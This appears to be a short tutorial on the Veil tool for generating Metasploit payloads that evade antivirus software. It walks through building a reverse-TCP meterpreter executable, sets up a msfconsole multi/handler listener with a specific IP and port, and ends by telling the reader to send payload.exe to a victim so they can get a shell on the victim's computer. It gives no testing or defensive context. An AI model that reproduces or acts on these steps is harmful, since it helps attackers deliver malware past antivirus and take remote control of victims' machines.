Veil – A Metasploit Payload Generator to Bypass Antivirus

Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.
First Download viel from here and unzip file and save in your desktop
Run setup script on Kali x86 ./setup.sh

Now Install Python 2.7.5 in your pc




Now open Veil Folder and run ./Veil.py and choose option 1

You can choose Metasploit’s standard msfvenom shellcode. I just chose the default, msfvenom

Now you can choose the type of payload, I just chose reverse TCP. Then enter the IP address of the Kali system and the port you want to use

Now select option 1 pyinstaller

This file should be placed in the rootDesktopVeildistpayload.exe

Open Kali terminal type msfconsole
Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.174
set lport 4444
exploit
Now send your payload.exe files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
